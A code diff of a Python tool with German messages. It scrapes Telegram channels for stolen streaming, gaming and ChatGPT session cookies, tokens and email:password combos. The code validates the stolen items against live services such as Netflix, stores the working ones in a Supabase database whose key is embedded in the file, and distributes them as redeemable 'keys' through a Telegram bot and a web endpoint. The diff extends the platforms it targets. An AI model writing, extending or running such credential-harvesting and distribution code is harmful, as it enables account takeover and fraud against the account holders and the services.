@@ -28,21 +28,51 @@ SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJ
 def get_headers():
     return {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}
 
-TELEGRAM_CHANNELS = ["freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos", "Netflix_Cookies", "Spotify_Premium", "FreeNetflixDaily", "Cookies_Netflix", "Netflix_Account_Drop", "Free_Account_Drop", "NetflixCookiesFree", "NetflixFreebies", "accountsharing", "streamingpartners", "Netflix_Drops", "Spotify_Accounts", "rtl_plus_free", "disney_plus_accounts", "crunchyroll_free"]
+TELEGRAM_CHANNELS = [
+    "freetohell", "Crackers_Official", "internettweaksforum", "netflix_disney_hotstar_nord", 
+    "mrplan254", "DARKNET240", "PremiumAccounts_Free", "Combos", "Netflix_Cookies", 
+    "Spotify_Premium", "FreeNetflixDaily", "Cookies_Netflix", "Netflix_Account_Drop", 
+    "Free_Account_Drop", "NetflixCookiesFree", "NetflixFreebies", "accountsharing", 
+    "streamingpartners", "Netflix_Drops", "Spotify_Accounts", "rtl_plus_free", 
+    "disney_plus_accounts", "crunchyroll_free", "steam_accounts", "minecraft_accounts", 
+    "chatgpt_accounts", "openai_accounts", "gaming_drops", "leaked_combos"
+]
 
-# Sucht nach Links UND E-Mail:Passwort
-PATTERN = re.compile(r'(https?://(?:www\.)?netflix\.com/(?:tv2|browse)\?nftoken=[^\s<"]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)', re.IGNORECASE)
+PATTERN = re.compile(
+    r'(https?://(?:www\.)?(?:netflix|spotify|disneyplus|rtlplus|crunchyroll|steam|minecraft|openai|chatgpt)\.(?:com|de|net)/[^\s<"]+)' |
+    r'((?:NetflixId|SecureNetflixId|sp_dc|sp_key|token|session)=[^;\s]+)' |
+    r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
+    re.IGNORECASE
+)
 
 def clean_link(link):
     return link.replace('</a>', '').replace('<br>', '').replace('"', '').strip()
 
-def test_link(link):
-    if not link.startswith('http'): return True # Combos werden blind akzeptiert
+def get_platform(item):
+    item_lower = item.lower()
+    if "netflix" in item_lower or "tv2" in item_lower or "browse" in item_lower: return "netflix"
+    if "spotify" in item_lower or "sp_dc" in item_lower: return "spotify"
+    if "disney" in item_lower: return "disney"
+    if "rtl" in item_lower or "tvnow" in item_lower: return "rtl"
+    if "crunchyroll" in item_lower: return "crunchyroll"
+    if "steam" in item_lower: return "steam"
+    if "minecraft" in item_lower or "mojang" in item_lower: return "minecraft"
+    if "openai" in item_lower or "chatgpt" in item_lower: return "chatgpt"
+    return "combo"
+
+def test_item(item):
+    if ':' in item and '@' in item: return True
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
     try:
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        r = requests.get(link, headers=headers, allow_redirects=False, timeout=5)
-        if r.status_code in [200, 301, 302] and 'login' not in r.headers.get('Location', '') and 'unsupported' not in r.headers.get('Location', ''):
-            return True
+        if item.startswith('http'):
+            r = requests.get(item, headers=headers, allow_redirects=False, timeout=5)
+            if r.status_code in [200, 301, 302] and 'login' not in r.headers.get('Location', '') and 'unsupported' not in r.headers.get('Location', ''):
+                return True
+        else:
+            headers['Cookie'] = item
+            r = requests.get('https://www.netflix.com/browse', headers=headers, allow_redirects=False, timeout=5)
+            if r.status_code == 200 and 'login' not in r.headers.get('Location', ''):
+                return True
     except: pass
     return False
 
@@ -51,47 +81,29 @@ def scan_telegram(channel):
     try:
         r = requests.get(f"https://t.me/s/{channel}", timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
         for m in PATTERN.findall(r.text):
-            link = clean_link(m[0]) if m[0] else m[1]
-            if link and test_link(link): found.append(link)
+            link = clean_link(m[0] or m[1] or m[2])
+            if link and test_item(link): found.append(link)
     except Exception: pass 
-    return found
-
-def scan_duckduckgo():
-    found = []
-    try:
-        q = 'site:pastebin.com "nftoken=" OR "NetflixId="'
-        r = requests.get(f"https://html.duckduckgo.com/html/?q={q}", timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
-        soup = BeautifulSoup(r.text, 'html.parser')
-        for a in soup.select('.result__a')[:5]:
-            url = a['href']
-            if 'pastebin.com' in url and '/raw/' not in url:
-                raw_url = url.replace('pastebin.com/', 'pastebin.com/raw/')
-                raw_r = requests.get(raw_url, timeout=5)
-                if raw_r.status_code == 200:
-                    for m in PATTERN.findall(raw_r.text):
-                        link = clean_link(m[0]) if m[0] else m[1]
-                        if link and test_link(link): found.append(link)
-    except Exception: pass
     return found
 
 def grabber_loop():
     while True:
         found_raw = []
-        with ThreadPoolExecutor(max_workers=10) as executor:
+        with ThreadPoolExecutor(max_workers=15) as executor:
             results = executor.map(scan_telegram, TELEGRAM_CHANNELS)
             for res in results: found_raw.extend(res)
-        found_raw.extend(scan_duckduckgo())
+        
         found_raw = list(set(found_raw)) 
         
         if found_raw:
             for item in found_raw:
                 check = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=eq.{item}", headers=get_headers())
                 if check.status_code == 200 and not check.json():
-                    platform = "combo" if ':' in item and '@' in item else "netflix"
-                    meta = {"email": "Login" if platform == "combo" else "Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
+                    platform = get_platform(item)
+                    meta = {"email": "Login" if ':' in item else "Link", "password": None, "country": "Unknown", "plan": "Premium", "profiles": []}
                     newKey = 'CLM-' + os.urandom(4).hex().upper()
                     requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=get_headers(), json={"key": newKey, "data": item, "metadata": meta, "used": False, "platform": platform})
-                    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🚨 **NEUER FUND!**\n\n{newKey}", "parse_mode": "Markdown"})
+                    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🚨 **NEUER FUND ({platform.upper()})!**\n\n{newKey}", "parse_mode": "Markdown"})
                     except: pass
         time.sleep(60)
 
@@ -99,10 +111,12 @@ def bot_loop():
     @bot.message_handler(commands=['start', 'key'])
     def send_key(message):
         try:
-            r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.netflix&limit=1", headers=get_headers())
+            args = message.text.split()
+            platform = args[1].lower() if len(args) > 1 else "netflix"
+            r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{platform}&limit=1", headers=get_headers())
             if r.status_code == 200 and r.json():
-                bot.reply_to(message, f"Dein Key: `{r.json()[0]['key']}`\n\nLöse ihn ein: https://multi-cloud-final.onrender.com", parse_mode='Markdown')
-            else: bot.reply_to(message, "❌ Keine Links verfügbar.")
+                bot.reply_to(message, f"Dein {platform.capitalize()} Key: `{r.json()[0]['key']}`\n\nLöse ihn ein: https://multi-cloud-final.onrender.com", parse_mode='Markdown')
+            else: bot.reply_to(message, f"❌ Keine {platform.capitalize()} Accounts verfügbar.")
         except: pass
     bot.polling(non_stop=True)
 
@@ -126,7 +140,7 @@ def claim():
 def replace():
     data = request.json
     old_key = data.get('key')
-    current_platform = data.get('platform', 'netflix') # Merkt sich, ob es ein Link oder Login war
+    current_platform = data.get('platform', 'netflix') 
     
     r = requests.get(f"{SUPABASE_URL}/rest/v1/keys?data=not.is.null&used=eq.false&platform=eq.{current_platform}&key=neq.{old_key}&limit=1", headers=get_headers())
     if r.status_code == 200 and r.json():
